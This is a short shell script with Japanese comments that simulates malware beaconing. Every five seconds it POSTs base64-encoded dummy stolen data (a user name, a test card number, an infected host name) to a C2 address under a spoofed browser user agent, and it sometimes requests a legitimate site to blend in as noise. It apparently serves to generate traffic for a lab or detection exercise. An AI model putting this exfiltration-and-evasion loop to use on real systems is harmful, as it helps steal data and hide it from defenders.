#!/bin/sh
# 5秒ごとにC2(10.10.7.66)へ持ち出しデータ(base64)をPOST。
# ときどき正規サイト(10.10.7.30)へもアクセスしてノイズを混ぜる。
PAYLOAD=$(printf '%s' 'user=alice;card=4111111111111111;host=INFECTED01' | base64 | tr -d '\n')
i=0
while true; do
  curl -s -A 'Mozilla/5.0 (Windows NT 10.0) beacon/1.0' \
       -X POST "http://10.10.7.66/api/beacon" --data "d=$PAYLOAD" -o /dev/null
  if [ $((i % 3)) -eq 0 ]; then
    curl -s "http://10.10.7.30/" -o /dev/null      # 正規サイトへのアクセス（ノイズ）
  fi
  i=$((i + 1))
  sleep 5
done
